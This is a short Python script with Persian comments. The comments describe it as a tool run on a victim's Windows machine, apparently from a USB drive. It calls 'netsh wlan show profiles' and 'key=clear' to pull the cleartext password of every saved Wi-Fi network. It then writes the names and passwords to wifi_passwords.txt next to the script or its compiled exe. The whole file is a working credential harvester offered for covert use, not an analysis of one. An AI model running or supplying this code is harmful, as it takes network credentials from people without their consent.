# اسکریپتی که روی سیستم قربانی توسط یه لش اجرا میشه و اسم تمام شبکه هایی که بهش وصل شده با پسووردشون رو داخل فایل تکست ذخیره میکنه
import subprocess
import os
import sys

# فانکشنی که میاد از ما یه نام شبکه میگیره و دستوری رو اجرا میکنه و رمز اون شبکه که قبلا بهش وصل شدیم رو بهمون برمیگردونه 
def pass_net(name_network):
    a = subprocess.getoutput(f"netsh wlan show profile name=\"{name_network}\" key=clear")
    password = [line.split(":")[1].strip() for line in a.split('\n') if "Key Content" in line]
    return password

# شروع اسکریپت
output = subprocess.getoutput("netsh wlan show profiles")
# 1. خروجی netsh رو به خط‌ها تقسیم کن
# 2. فقط خط‌هایی رو بگیر که شامل "All User Profile" هستن
# 3. هر خط رو با ":" تقسیم کن و بخش دوم (اسم شبکه) رو بگیر
# 4. فاصله‌های اضافی رو حذف کن
# 5. همه رو توی یه لیست بریز
profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]

# ========== پیدا کردن مسیر درست ==========
if getattr(sys, 'frozen', False):
    # اگر فایل exe هست
    current_path = os.path.dirname(sys.executable)
else:
    # اگر فایل py هست
    current_path = os.path.dirname(os.path.abspath(__file__))

path = os.path.join(current_path, "wifi_passwords.txt")
# ===================================

with open(path, "w", encoding="utf-8") as f:
    for i in profiles :
        passes = pass_net(i)
        result ="".join(passes)
        f.write(f"{i} : {result}\n")

print(f"\n✅ اطلاعات در {path} ذخیره شد!")
